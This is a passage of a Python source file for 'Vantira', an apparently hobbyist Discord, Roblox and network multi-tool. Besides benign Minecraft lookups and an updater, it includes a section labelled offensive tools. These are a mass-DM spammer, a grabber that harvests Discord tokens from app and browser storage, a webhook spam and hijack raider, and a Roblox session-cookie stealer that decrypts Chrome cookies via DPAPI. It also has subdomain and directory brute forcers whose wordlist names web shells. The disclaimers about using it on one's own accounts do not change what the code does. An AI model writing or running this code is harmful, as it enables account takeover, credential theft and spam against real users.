                console.print(f"  [cyan]{'mods':>16}[/cyan]  [yellow]{len(mods)} detected[/yellow]")
            if pl_list:
                console.print(f"\n  [bold magenta]── ONLINE PLAYERS ({len(pl_list)}) ──────────────[/bold magenta]")
                for p in pl_list[:20]:
                    console.print(f"  [grey50]•[/grey50]  [white]{p.get('name','?')}[/white]  [grey50]{p.get('uuid','?')}[/grey50]")
                if len(pl_list) > 20:
                    console.print(f"  [grey50]... and {len(pl_list)-20} more[/grey50]")
        else:
            if d.get("hostname"): console.print(f"  [cyan]{'hostname':>16}[/cyan]  [grey50]{d['hostname']}[/grey50]")

        _SESSION_ACTIONS[0] += 1
        _log("MC_SERVER", f"{host}:{port}")
    except Exception as e:
        _err(str(e))
    _pause()


def mc_name_check():
    if not _need_req(): return
    _header("MINECRAFT NAME AVAILABILITY")
    console.print("  [grey50]check if a username is taken or available[/grey50]\n")
    console.print("  [grey50]paste names one per line, blank to check[/grey50]\n")

    names = []
    while True:
        line = console.input("  ").strip()
        if not line: break
        names.append(line)

    if not names: _err("no names"); _pause(); return

    console.print()
    for name in names:
        try:
            r = _session().get(f"{_MC_API}/users/profiles/minecraft/{name}", timeout=8)
            if r.status_code == 200:
                taken_by = r.json().get("name", name)
                console.print(f"  [red]✗ TAKEN[/red]    [white]{taken_by}[/white]")
            elif r.status_code in (404, 204):
                console.print(f"  [green]✓ AVAILABLE[/green]  [white]{name}[/white]")
            elif r.status_code == 400:
                console.print(f"  [yellow]? INVALID[/yellow]   [grey50]{name} (bad format)[/grey50]")
            else:
                console.print(f"  [yellow]? UNKNOWN[/yellow]   [grey50]{name} [{r.status_code}][/grey50]")
        except Exception as e:
            console.print(f"  [red]ERROR[/red]  [grey50]{name}: {e}[/grey50]")
        time.sleep(0.6)

    _SESSION_ACTIONS[0] += 1
    _log("MC_NAME_CHECK", f"{len(names)} names")
    _pause()


# ═════════════════════════════════════════════════════════════
#  STATS DASHBOARD  (shown on startup after intro)
# ═════════════════════════════════════════════════════════════

def _draw_dashboard(update_available: bool = False, latest_ver: str = ""):
    """Premium stats panel shown once on startup."""
    wipe()
    console.print(_frozen_logo())

    uptime_s    = int(time.time() - _SESSION_START)
    m, s        = divmod(uptime_s, 60)
    h, m        = divmod(m, 60)
    uptime      = f"{h:02d}:{m:02d}:{s:02d}"
    total_tools = len(_ITEMS)
    sections    = len([label for label,fn,col in MENU if fn is None])

    console.print(f"  [grey50]{'─'*55}[/grey50]")
    # update banner if available
    if update_available:
        console.print(f"  [bold green]  ★ UPDATE AVAILABLE — v{latest_ver}  "
                      f"[grey50](use Check for Updates to install)[/grey50][/bold green]")
    else:
        console.print(f"  [bold white]  VANTIRA v{VERSION}[/bold white]  "
                      f"[grey50]by djbrezz  ·  github.com/djbrezz/vantira[/grey50]")
    console.print(f"  [grey50]{'─'*55}[/grey50]\n")

    cols = [
        ("[magenta]tools[/magenta]",      str(total_tools)),
        ("[cyan]sections[/cyan]",         str(sections)),
        ("[green]actions[/green]",        str(_SESSION_ACTIONS[0])),
        ("[yellow]uptime[/yellow]",       uptime),
        ("[white]log entries[/white]",    str(len(LOG))),
        ("[blue]webhook[/blue]",          "[green]● set[/green]" if WEBHOOK else "[red]● none[/red]"),
        ("[grey50]config[/grey50]",       "[green]● loaded[/green]" if os.path.exists(_CONFIG_FILE) else "[grey50]● default[/grey50]"),
        ("[grey50]data folder[/grey50]",  os.path.basename(_DATA_DIR)),
    ]

    for label, val in cols:
        console.print(f"  {label:>34}  {val}")

    console.print(f"\n  [grey50]{'─'*55}[/grey50]\n")
    console.input("  [grey50]press enter...[/grey50]")



# ═════════════════════════════════════════════════════════════
#  AUTO-UPDATER  (github.com/itzbrezz/vantira)
# ═════════════════════════════════════════════════════════════
_GH_USER    = "itzbrezz"
_GH_REPO    = "vantira"
_VER_URL    = f"https://raw.githubusercontent.com/{_GH_USER}/{_GH_REPO}/main/version.txt"
_RAW_URL    = f"https://raw.githubusercontent.com/{_GH_USER}/{_GH_REPO}/main/vantira.py"
_CHANGELOG  = f"https://raw.githubusercontent.com/{_GH_USER}/{_GH_REPO}/main/changelog.txt"


def _check_update_silent() -> tuple[bool, str]:
    """
    Silently checks for a newer version on GitHub.
    Returns (update_available: bool, latest_version: str).
    Never raises — network failure returns (False, "").
    """
    if not HAS_REQ:
        return False, ""
    try:
        r = _session().get(_VER_URL, timeout=5)
        if r.status_code == 200:
            latest = r.text.strip()
            if latest != VERSION:
                return True, latest
    except Exception:
        pass
    return False, ""


def updater_check():
    """Manual update check from the menu."""
    _header("AUTO-UPDATER")
    console.print(f"  [grey50]checking github.com/{_GH_USER}/{_GH_REPO}...[/grey50]\n")
    available, latest = _check_update_silent()

    if not available and not latest:
        _warn("could not reach GitHub — check your connection")
        _pause(); return

    if not available:
        _ok(f"you're on the latest version ([white]v{VERSION}[/white])")
        _pause(); return

    console.print(f"  [bold green]update available![/bold green]  [grey50]v{VERSION}[/grey50] → [bold white]v{latest}[/bold white]\n")

    # try fetch changelog
    try:
        cr = _session().get(_CHANGELOG, timeout=5)
        if cr.status_code == 200:
            console.print(f"  [bold white]changelog:[/bold white]")
            for line in cr.text.strip().splitlines()[:20]:
                console.print(f"  [grey50]{line}[/grey50]")
            console.print()
    except Exception:
        pass

    if _ask("download and install update? (y/N): ").lower() != "y":
        _pause(); return

    try:
        console.print(f"[grey50]downloading v{latest}...[/grey50]")
        r = _session().get(_RAW_URL, timeout=30)
        if r.status_code != 200:
            _err(f"download failed [{r.status_code}]"); _pause(); return

        # write new version next to current file
        self_path = os.path.abspath(__file__)
        backup    = self_path + f".bak_v{VERSION}"
        new_path  = self_path + ".new"

        # backup current
        import shutil
        shutil.copy2(self_path, backup)
        _info(f"backed up current version to {os.path.basename(backup)}")

        # write new file
        with open(new_path, "w", encoding="utf-8") as f:
            f.write(r.text)

        # replace atomically
        os.replace(new_path, self_path)
        _ok(f"updated to v{latest}! restart Vantira to apply.")
        console.print(f"  [grey50]backup saved: {backup}[/grey50]")
        _log("UPDATE", f"v{VERSION}→v{latest}")

    except Exception as e:
        _err(f"update failed: {e}")
    _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION : DISCORD OFFENSIVE TOOLS ───────────────────────
# ═════════════════════════════════════════════════════════════

def disc_mass_dm():
    """Mass DM all members of a server via a user/bot token."""
    if not _need_req(): return
    _header("MASS DM")
    console.print("  [grey50]DMs every member of a server using a bot/user token[/grey50]")
    console.print("  [grey50]only use on servers you own or have permission to test[/grey50]\n")

    token    = _ask("token: ").strip()
    guild_id = _ask("server (guild) ID: ").strip()
    message  = _ask("message to send: ").strip()

    if not all([token, guild_id, message]):
        _err("all fields required"); _pause(); return

    auth = f"Bot {token}" if not token.startswith("Bot ") else token
    base = "https://discord.com/api/v10"

    # fetch member list
    _info("fetching member list...")
    members = []
    after   = 0
    while True:
        try:
            r = _session().get(
                f"{base}/guilds/{guild_id}/members?limit=1000&after={after}",
                headers={"Authorization": auth}, timeout=10
            )
            if r.status_code == 403:
                _err("missing permissions — bot needs GUILD_MEMBERS intent"); _pause(); return
            if r.status_code != 200:
                _err(f"fetch failed [{r.status_code}]"); _pause(); return
            batch = r.json()
            if not batch: break
            members.extend(batch)
            after = batch[-1]["user"]["id"]
            if len(batch) < 1000: break
        except Exception as e:
            _err(str(e)); _pause(); return

    # filter out bots
    humans = [m for m in members if not m.get("user",{}).get("bot", False)]
    _info(f"found {len(humans)} human members (filtered {len(members)-len(humans)} bots)")

    if _ask(f"send to all {len(humans)} members? (y/N): ").lower() != "y":
        _pause(); return

    sent = 0; failed = 0; skipped = 0
    delay = float(_ask("delay between DMs (seconds, min 1.5): ") or "1.5")
    delay = max(1.5, delay)

    for i, member in enumerate(humans, 1):
        user = member.get("user", {})
        uid  = user.get("id", "?")
        name = user.get("username", "?")
        try:
            # open DM channel first
            dm_r = _session().post(
                f"{base}/users/@me/channels",
                headers={"Authorization": auth, "Content-Type": "application/json"},
                json={"recipient_id": uid}, timeout=8
            )
            if dm_r.status_code not in (200, 201):
                skipped += 1
                console.print(f"  [{i:>4}] [grey50]SKIP[/grey50]  [grey50]{name}[/grey50]")
                continue

            ch_id = dm_r.json().get("id")
            msg_r = _session().post(
                f"{base}/channels/{ch_id}/messages",
                headers={"Authorization": auth, "Content-Type": "application/json"},
                json={"content": message}, timeout=8
            )
            if msg_r.status_code in (200, 201):
                sent += 1
                console.print(f"  [{i:>4}] [green]✓[/green]  [white]{name}[/white]")
            elif msg_r.status_code == 429:
                wait = msg_r.json().get("retry_after", 5)
                _warn(f"rate limited — sleeping {wait:.1f}s")
                time.sleep(float(wait))
                failed += 1
            else:
                failed += 1
                console.print(f"  [{i:>4}] [red]✗[/red]  [grey50]{name} [{msg_r.status_code}][/grey50]")
        except Exception as e:
            failed += 1
            console.print(f"  [{i:>4}] [red]ERR[/red] [grey50]{name}: {e}[/grey50]")
        time.sleep(delay)

    console.print()
    _ok(f"done — sent: {sent}  failed: {failed}  skipped: {skipped}")
    _log("MASS_DM", f"sent={sent} fail={failed}")
    _pause()


def disc_local_token_grab():
    """Scan YOUR OWN machine's Discord app data for stored tokens."""
    _header("LOCAL DISCORD TOKEN GRABBER")
    console.print("  [grey50]scans your own machine's Discord leveldb for cached tokens[/grey50]\n")

    import re, platform
    found = []
    TOKEN_RE = re.compile(r"[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}")

    # common paths across platforms
    paths = []
    if os.name == "nt":
        appdata  = os.environ.get("APPDATA", "")
        localapp = os.environ.get("LOCALAPPDATA", "")
        paths = [
            os.path.join(appdata,  "discord",          "Local Storage", "leveldb"),
            os.path.join(appdata,  "discordcanary",    "Local Storage", "leveldb"),
            os.path.join(appdata,  "discordptb",       "Local Storage", "leveldb"),
            os.path.join(appdata,  "discorddevelopment","Local Storage", "leveldb"),
            os.path.join(localapp, "Discord",           "Local Storage", "leveldb"),
            # browser paths
            os.path.join(localapp, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(localapp, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(appdata,  "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
        ]
    elif sys.platform == "darwin":
        home = os.path.expanduser("~")
        paths = [
            os.path.join(home, "Library","Application Support","discord","Local Storage","leveldb"),
            os.path.join(home, "Library","Application Support","Google","Chrome","Default","Local Storage","leveldb"),
        ]
    else:
        home = os.path.expanduser("~")
        paths = [
            os.path.join(home, ".config", "discord", "Local Storage", "leveldb"),
            os.path.join(home, ".config", "google-chrome", "Default", "Local Storage", "leveldb"),
        ]

    _info("scanning Discord app data paths...")
    seen = set()

    for path in paths:
        if not os.path.isdir(path): continue
        _info(f"scanning: [grey50]{path}[/grey50]")
        for fname in os.listdir(path):
            if not fname.endswith((".ldb", ".log")): continue
            fpath = os.path.join(path, fname)
            try:
                with open(fpath, "rb") as f:
                    content = f.read().decode("utf-8", errors="ignore")
                for match in TOKEN_RE.finditer(content):
                    token = match.group(0)
                    if token in seen: continue
                    seen.add(token)
                    found.append((token, path))
            except Exception:
                continue

    if not found:
        _warn("no tokens found — Discord may be using encrypted storage (v3+)")
        console.print("  [grey50]newer Discord versions encrypt tokens with DPAPI.[/grey50]")
        console.print("  [grey50]use the Token Checker tool if you already have a token.[/grey50]")
        _pause(); return

    console.print(f"[bold green]found {len(found)} token(s):[/bold green]\n")
    for token, src_path in found:
        # decode user ID
        try:
            seg = token.split(".")[0]
            seg += "=" * (-len(seg) % 4)
            uid = base64.b64decode(seg).decode(errors="replace").strip()
        except Exception:
            uid = "?"

        console.print(f"  [green]TOKEN[/green]  [white]{token}[/white]")
        console.print(f"  [grey50]         uid: {uid}  source: {os.path.basename(src_path)}[/grey50]")

        # auto-validate
        if _need_req():
            try:
                r = _session().get(
                    "https://discord.com/api/v10/users/@me",
                    headers={"Authorization": token}, timeout=8
                )
                if r.status_code == 200:
                    d   = r.json()
                    tag = f"@{d.get('username','?')}"
                    console.print(f"  [bold green]✓ VALID[/bold green]  {tag}  "
                                  f"[grey50]email: {d.get('email','?')}[/grey50]\n")
                else:
                    console.print(f"  [red]✗ invalid [{r.status_code}][/red]")
            except Exception:
                pass

    _log("LOCAL_TOKEN", f"{len(found)} found")
    _pause()


def disc_webhook_raider():
    """Full webhook raider — spam, rename, avatar change, delete, all in one."""
    if not _need_req() or not _need_wh(): return
    _header("WEBHOOK RAIDER")
    console.print("  [grey50]all-in-one webhook destruction toolkit[/grey50]")
    console.print("  [red]only use on webhooks you own[/red]\n")

    console.print("  [grey50]1[/grey50]  spam bomb (mass messages, threaded)")
    console.print("  [grey50]2[/grey50]  rename to custom name")
    console.print("  [grey50]3[/grey50]  avatar change")
    console.print("  [grey50]4[/grey50]  full raid (rename + avatar + spam + delete)")
    console.print("  [grey50]5[/grey50]  info dump + token extract\n")

    choice = _ask("select: ")

    if choice == "1":
        msg = _ask("spam message: ")
        try:
            count   = int(_ask("count: "))
            threads = min(int(_ask("threads (1-20): ")), 20)
            delay   = float(_ask("delay (s): ") or "0")
        except: _err("invalid"); _pause(); return
        q  = Queue()
        ok_=[0]; er_=[0]; lk=threading.Lock()
        for _ in range(count): q.put({"content": msg})
        def _worker():
            while True:
                try: p = q.get_nowait()
                except: return
                r = _session().post(WEBHOOK, json=p, timeout=10)
                with lk:
                    if r.status_code in (200,204): ok_[0]+=1
                    else: er_[0]+=1
                if delay: time.sleep(delay)
                q.task_done()
        pool=[threading.Thread(target=_worker,daemon=True) for _ in range(threads)]
        for t in pool: t.start()
        for t in pool: t.join()
        _ok(f"bombed — {ok_[0]} sent {er_[0]} failed")

    elif choice == "2":
        name = _ask("new name: ")
        r = _session().patch(WEBHOOK, json={"name": name}, timeout=10)
        _ok("renamed") if r.status_code == 200 else _err(f"{r.status_code}")

    elif choice == "3":
        url = _ask("avatar image url: ")
        try:
            img  = _session().get(url, timeout=10).content
            ext  = url.rsplit(".",1)[-1].lower()
            mime = "gif" if ext=="gif" else "png"
            b64  = base64.b64encode(img).decode()
            r    = _session().patch(WEBHOOK, json={"avatar": f"data:image/{mime};base64,{b64}"}, timeout=10)
            _ok("avatar changed") if r.status_code == 200 else _err(f"{r.status_code}")
        except Exception as e: _err(str(e))

    elif choice == "4":
        name    = _ask("raid name: ")
        avi_url = _ask("raid avatar url: ")
        msg     = _ask("spam message: ")
        try:
            count = int(_ask("spam count: "))
        except: count = 50

        _info("step 1/3 — renaming...")
        try:
            _session().patch(WEBHOOK, json={"name": name}, timeout=10)
        except: pass

        _info("step 2/3 — changing avatar...")
        try:
            img = _session().get(avi_url, timeout=10).content
            ext = avi_url.rsplit(".",1)[-1].lower()
            mime= "gif" if ext=="gif" else "png"
            b64 = base64.b64encode(img).decode()
            _session().patch(WEBHOOK, json={"avatar": f"data:image/{mime};base64,{b64}"}, timeout=10)
        except: pass

        _info("step 3/3 — bombing...")
        ok_=[0]
        for i in range(count):
            r = _session().post(WEBHOOK, json={"content": msg}, timeout=10)
            if r.status_code in (200,204): ok_[0]+=1
            if r.status_code == 429:
                time.sleep(r.json().get("retry_after",1))
            console.print(f"[{i+1}/{count}] [green]{ok_[0]}✓[/green]", end="")
        console.print()
        _ok(f"raid complete — {ok_[0]}/{count} messages sent")

    elif choice == "5":
        r = _session().get(WEBHOOK, timeout=10)
        if r.status_code == 200:
            d = r.json()
            for k,v in d.items():
                console.print(f"  [cyan]{k:>20}[/cyan]  [white]{json.dumps(v)}[/white]")
            token = d.get("token","")
            if token:
                console.print(f"[yellow]token exposed:[/yellow] [white]{token}[/white]")

    _log("WH_RAIDER", choice)
    _pause()


def disc_server_backup():
    """Export full server structure to JSON — channels, roles, settings."""
    if not _need_req(): return
    _header("SERVER BACKUP")
    console.print("  [grey50]exports full server structure to JSON in vantira_data/exports/[/grey50]\n")

    token    = _ask("bot token: ").strip()
    guild_id = _ask("server ID: ").strip()

    if not token or not guild_id:
        _err("both required"); _pause(); return

    auth = f"Bot {token}" if not token.startswith("Bot ") else token
    base = "https://discord.com/api/v10"
    backup = {}

    _info("fetching guild info...")
    try:
        r = _session().get(f"{base}/guilds/{guild_id}?with_counts=true",
                           headers={"Authorization": auth}, timeout=10)
        if r.status_code == 403: _err("bot not in server"); _pause(); return
        if r.status_code != 200: _err(f"{r.status_code}"); _pause(); return
        backup["guild"] = r.json()
        _ok(f"guild: [white]{backup['guild'].get('name','?')}[/white]")
    except Exception as e: _err(str(e)); _pause(); return

    _info("fetching channels...")
    try:
        r = _session().get(f"{base}/guilds/{guild_id}/channels",
                           headers={"Authorization": auth}, timeout=10)
        backup["channels"] = r.json() if r.status_code == 200 else []
        _ok(f"{len(backup['channels'])} channels")
    except: backup["channels"] = []

    _info("fetching roles...")
    try:
        r = _session().get(f"{base}/guilds/{guild_id}/roles",
                           headers={"Authorization": auth}, timeout=10)
        backup["roles"] = r.json() if r.status_code == 200 else []
        _ok(f"{len(backup['roles'])} roles")
    except: backup["roles"] = []

    _info("fetching emojis...")
    try:
        r = _session().get(f"{base}/guilds/{guild_id}/emojis",
                           headers={"Authorization": auth}, timeout=10)
        backup["emojis"] = r.json() if r.status_code == 200 else []
        _ok(f"{len(backup['emojis'])} emojis")
    except: backup["emojis"] = []

    _info("fetching webhooks...")
    try:
        r = _session().get(f"{base}/guilds/{guild_id}/webhooks",
                           headers={"Authorization": auth}, timeout=10)
        backup["webhooks"] = r.json() if r.status_code == 200 else []
        _ok(f"{len(backup['webhooks'])} webhooks")
    except: backup["webhooks"] = []

    _info("fetching stickers...")
    try:
        r = _session().get(f"{base}/guilds/{guild_id}/stickers",
                           headers={"Authorization": auth}, timeout=10)
        backup["stickers"] = r.json() if r.status_code == 200 else []
        _ok(f"{len(backup['stickers'])} stickers")
    except: backup["stickers"] = []

    # metadata
    backup["meta"] = {
        "exported_at"   : datetime.now(timezone.utc).isoformat(),
        "exported_by"   : "Vantira v" + VERSION,
        "guild_id"      : guild_id,
    }

    # save
    fname = os.path.join(_DATA_DIR, "exports", f"backup_{guild_id}_{int(time.time())}.json")
    with open(fname, "w", encoding="utf-8") as f:
        json.dump(backup, f, indent=2, ensure_ascii=False)

    _ok(f"backup saved → {fname}")
    console.print(f"[bold white]summary:[/bold white]")
    console.print(f"  [grey50]channels : {len(backup.get('channels',[]))}[/grey50]")
    console.print(f"  [grey50]roles    : {len(backup.get('roles',[]))}[/grey50]")
    console.print(f"  [grey50]emojis   : {len(backup.get('emojis',[]))}[/grey50]")
    console.print(f"  [grey50]webhooks : {len(backup.get('webhooks',[]))}[/grey50]")
    console.print(f"  [grey50]stickers : {len(backup.get('stickers',[]))}[/grey50]")
    _log("SERVER_BACKUP", guild_id)
    _pause()


def rblx_browser_cookie():
    """Grab YOUR OWN .ROBLOSECURITY from browser cookie stores."""
    _header("ROBLOX COOKIE GRABBER")
    console.print("  [grey50]scans YOUR OWN browser cookie stores for .ROBLOSECURITY[/grey50]\n")

    import sqlite3, shutil, tempfile

    paths = []
    if os.name == "nt":
        localapp = os.environ.get("LOCALAPPDATA","")
        appdata  = os.environ.get("APPDATA","")
        paths = [
            (os.path.join(localapp,"Google","Chrome","User Data","Default","Cookies"),       "Chrome"),
            (os.path.join(localapp,"Google","Chrome","User Data","Default","Network","Cookies"),"Chrome"),
            (os.path.join(localapp,"BraveSoftware","Brave-Browser","User Data","Default","Cookies"),"Brave"),
            (os.path.join(localapp,"Microsoft","Edge","User Data","Default","Cookies"),      "Edge"),
            (os.path.join(appdata, "Opera Software","Opera Stable","Cookies"),               "Opera"),
            (os.path.join(localapp,"Vivaldi","User Data","Default","Cookies"),               "Vivaldi"),
        ]
    elif sys.platform == "darwin":
        home = os.path.expanduser("~")
        paths = [
            (os.path.join(home,"Library","Application Support","Google","Chrome","Default","Cookies"),"Chrome"),
            (os.path.join(home,"Library","Application Support","BraveSoftware","Brave-Browser","Default","Cookies"),"Brave"),
        ]
    else:
        home = os.path.expanduser("~")
        paths = [
            (os.path.join(home,".config","google-chrome","Default","Cookies"),"Chrome"),
            (os.path.join(home,".config","chromium","Default","Cookies"),"Chromium"),
        ]

    found = []
    for cookie_path, browser in paths:
        if not os.path.exists(cookie_path): continue
        try:
            # copy to temp — browser locks the file while open
            tmp = os.path.join(tempfile.gettempdir(), f"vantira_cookies_{browser}.db")
            shutil.copy2(cookie_path, tmp)

            conn = sqlite3.connect(tmp)
            cur  = conn.cursor()
            cur.execute(
                "SELECT host_key, name, value, encrypted_value FROM cookies "
                "WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'"
            )
            rows = cur.fetchall()
            conn.close()
            os.remove(tmp)

            for host, name, value, enc_value in rows:
                cookie_val = value or ""
                if not cookie_val and enc_value:
                    # encrypted — DPAPI decrypt (Windows only)
                    if os.name == "nt":
                        try:
                            import ctypes
                            import ctypes.wintypes as wt
                            class DATA_BLOB(ctypes.Structure):
                                _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                            p      = ctypes.create_string_buffer(enc_value[3:], len(enc_value)-3)
                            blobin = DATA_BLOB(ctypes.sizeof(p), p)
                            blobout= DATA_BLOB()
                            ctypes.windll.crypt32.CryptUnprotectData(
                                ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)
                            )
                            cookie_val = ctypes.string_at(blobout.pbData, blobout.cbData).decode(errors="ignore")
                        except Exception:
                            cookie_val = "[encrypted - run as same user]"
                    else:
                        cookie_val = "[encrypted]"
                if cookie_val:
                    found.append((browser, cookie_val))
        except Exception:
            continue

    if not found:
        _warn("no .ROBLOSECURITY cookies found")
        console.print("  [grey50]make sure you're logged into roblox.com in a browser[/grey50]")
        _pause(); return

    console.print(f"  [bold green]found {len(found)} cookie(s):[/bold green]")
    for browser, cookie in found:
        console.print(f"  [cyan]{browser}[/cyan]")
        console.print(f"  [white]{cookie[:80]}{'...' if len(cookie)>80 else ''}[/white]")

        if HAS_REQ and _ask("  validate this cookie? (y/N): ").lower() == "y":
            s = _session()
            s.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
            r = s.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
            if r.status_code == 200:
                d = r.json()
                _ok(f"valid! [white]{d.get('name','?')}[/white] (ID: {d.get('id','?')})")
            else:
                _err(f"invalid [{r.status_code}]")
        console.print()

    _log("RBLX_COOKIE_GRAB", f"{len(found)} found")
    _pause()


def misc_subdomain_brute():
    """Brute force subdomains against a target domain."""
    if not _need_req(): return
    _header("SUBDOMAIN BRUTE FORCER")
    console.print("  [grey50]threaded DNS resolution against a wordlist[/grey50]\n")

    domain = _ask("target domain (e.g. example.com): ").strip().lower()
    if not domain: _err("no domain"); _pause(); return

    # built-in common subdomain wordlist
    WORDLIST = [
        "www","mail","ftp","admin","api","dev","test","staging","beta","app",
        "blog","shop","store","support","help","docs","cdn","static","assets",
        "img","images","media","upload","download","files","secure","login",
        "auth","oauth","sso","vpn","remote","ssh","rdp","server","ns1","ns2",
        "mx","smtp","pop","imap","webmail","portal","dashboard","panel","cpanel",
        "whm","plesk","phpmyadmin","mysql","db","database","redis","mongo",
        "elastic","kibana","grafana","prometheus","jenkins","gitlab","github",
        "jira","confluence","slack","teams","meet","video","stream","live",
        "m","mobile","wap","old","new","v1","v2","v3","api2","api3",
        "internal","intranet","corp","vpn2","uat","qa","sandbox","demo",
        "status","monitor","health","metrics","logs","audit",
    ]

    custom = _ask("custom wordlist file (blank = use built-in 80 words): ").strip()
    if custom and os.path.isfile(custom):
        with open(custom) as f:
            WORDLIST = [l.strip() for l in f if l.strip()]
        _info(f"loaded {len(WORDLIST)} words from {custom}")
    else:
        _info(f"using built-in {len(WORDLIST)}-word list")

    try:
        threads = int(_ask("threads (default 30): ") or "30")
    except: threads = 30

    found   = []
    lock    = threading.Lock()
    q       = Queue()
    done    = [0]
    total   = len(WORDLIST)

    for word in WORDLIST:
        q.put(word)

    def worker():
        while True:
            try: sub = q.get_nowait()
            except: return
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                with lock:
                    found.append((fqdn, ip))
                    done[0] += 1
                    console.print(f"  [green]FOUND[/green]  [white]{fqdn:<45}[/white]  [cyan]{ip}[/cyan]")
            except socket.gaierror:
                with lock:
                    done[0] += 1
            q.task_done()

    pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    console.print()
    for t in pool: t.start()

    while not q.empty() or any(t.is_alive() for t in pool):
        bw   = 35
        fill = int(bw * done[0] / max(total, 1))
        bar  = "[magenta]"+"█"*fill+"[/magenta][grey50]"+"░"*(bw-fill)+"[/grey50]"
        console.print(f"{bar} {done[0]}/{total}  [green]{len(found)} found[/green]", end="")
        time.sleep(0.1)
    for t in pool: t.join()
    console.print()

    if found:
        _ok(f"found {len(found)} subdomain(s):")
        if _ask("export to file? (y/N): ").lower() == "y":
            fname = os.path.join(_DATA_DIR,"exports",f"subdomains_{domain}_{int(time.time())}.txt")
            with open(fname,"w") as f:
                for fqdn, ip in found:
                    f.write(f"{fqdn}	{ip}")
            _ok(f"saved → {fname}")
    else:
        _warn("no subdomains found")

    _log("SUBDOMAIN", f"{domain} → {len(found)}")
    _pause()


def misc_dir_brute():
    """Brute force directories and files on a web target."""
    if not _need_req(): return
    _header("DIRECTORY BRUTE FORCER")
    console.print("  [grey50]threaded HTTP path discovery[/grey50]\n")

    url = _ask("target URL (e.g. https://example.com): ").strip().rstrip("/")
    if not url: _err("no url"); _pause(); return

    WORDLIST = [
        "admin","login","dashboard","panel","cpanel","wp-admin","administrator",
        "phpmyadmin","api","api/v1","api/v2","backup","backups","config","conf",
        ".env",".git","wp-content","wp-includes","wp-login.php","xmlrpc.php",
        "robots.txt","sitemap.xml","sitemap_index.xml","crossdomain.xml",
        "assets","static","css","js","images","img","upload","uploads","files",
        "media","docs","documentation","swagger","swagger-ui","openapi",
        "test","testing","dev","development","staging","beta","old","new",
        "user","users","account","accounts","profile","profiles","auth","oauth",
        "register","signup","signin","logout","forgot","reset","password",
        "search","shop","store","cart","checkout","payment","order","orders",
        "blog","news","posts","articles","page","pages","category","tag",
        "mail","email","webmail","smtp","ftp","ssh","db","database","sql",
        "server-status","server-info","info.php","phpinfo.php","test.php",
        "shell.php","c99.php","r57.php","b374k.php",
        ".htaccess",".htpasswd","web.config","Makefile","Dockerfile",
        "package.json","composer.json","requirements.txt","Gemfile",
    ]

    custom = _ask("custom wordlist file (blank = built-in): ").strip()
    if custom and os.path.isfile(custom):
        with open(custom) as f:
            WORDLIST = [l.strip() for l in f if l.strip()]
        _info(f"loaded {len(WORDLIST)} paths")

    try:
        threads = int(_ask("threads (default 20): ") or "20")
        codes   = _ask("show status codes (default 200,301,302,403): ") or "200,301,302,403"
        want    = {int(c.strip()) for c in codes.split(",")}
    except: threads = 20; want = {200,301,302,403}

    found = []
    lock  = threading.Lock()
    q     = Queue()
    done  = [0]
    total = len(WORDLIST)

    for path in WORDLIST:
        q.put(path)

    def worker():
        s = _session()
        while True:
            try: path = q.get_nowait()
            except: return
            full = f"{url}/{path}"
            try:
                r = s.get(full, timeout=6, allow_redirects=False)
                with lock:
                    done[0] += 1
                    if r.status_code in want:
                        found.append((r.status_code, full))
                        col = ("green" if r.status_code==200 else
                               "yellow" if r.status_code in (301,302) else "red")
                        console.print(f"  [{col}]{r.status_code}[/{col}]  [white]{full}[/white]")
            except Exception:
                with lock:
                    done[0] += 1
            q.task_done()

    pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    console.print()
    for t in pool: t.start()

    while not q.empty() or any(t.is_alive() for t in pool):
        bw   = 35
        fill = int(bw * done[0] / max(total, 1))
        bar  = "[magenta]"+"█"*fill+"[/magenta][grey50]"+"░"*(bw-fill)+"[/grey50]"
        console.print(f"{bar} {done[0]}/{total}  [green]{len(found)} found[/green]", end="")
        time.sleep(0.12)
    for t in pool: t.join()
    console.print()

    if found and _ask("export? (y/N): ").lower() == "y":
        fname = os.path.join(_DATA_DIR,"exports",f"dirbust_{int(time.time())}.txt")
        with open(fname,"w") as f:
            for code, path in found:
                f.write(f"{code}	{path}")
        _ok(f"saved → {fname}")

    _log("DIRBUST", f"{url} → {len(found)}")
    _pause()


# ═════════════════════════════════════════════════════════════
#  MENU STRUCTURE
# ═════════════════════════════════════════════════════════════
MENU = [
    # ── discord webhook ──────────────────────────────────────
    ("DISCORD WEBHOOK", None, None),
    ("Set / Load Webhook",          wh_set,          "bold magenta"),
    ("Quick Fire  ✦",               wh_quick,        "green"),
    ("Send Message",                wh_send,         "green"),
    ("Embed Builder",               wh_embed,        "green"),
    ("Send File",                   wh_file,         "green"),
    ("Mass Send  [threaded]",       wh_mass,         "dark_orange"),
    ("Mention Spammer",             wh_spam_mentions,"dark_orange"),
    ("Scheduled Send",              wh_scheduled,    "dark_orange"),
    ("Fuzz Payloads",               wh_fuzz,         "dark_orange"),
    ("Webhook Recon",               wh_info,         "cyan"),
    ("Clone Identity",              wh_clone,        "cyan"),
    ("Edit Webhook",                wh_edit,         "cyan"),
    ("Raw JSON Payload",            wh_raw,          "cyan"),
    ("Delete Webhook",              wh_delete,       "red"),
    ("Proxy Config",                wh_proxy,        "grey70"),
    # ── network ──────────────────────────────────────────────
    ("NETWORK TOOLS", None, None),
    ("Port Scanner",                net_portscan,    "bold cyan"),
    ("DNS Lookup",                  net_dns,         "cyan"),
    ("IP Info / Whois",             net_whois_ip,    "cyan"),
    ("HTTP Header Inspector",       net_http_headers,"cyan"),
    ("Ping",                        net_ping,        "cyan"),
    ("Traceroute",                  net_traceroute,  "cyan"),
    ("Subnet Calculator",           net_ipcalc,      "cyan"),
    # ── encode / crypto ──────────────────────────────────────
    ("ENCODE / CRYPTO", None, None),
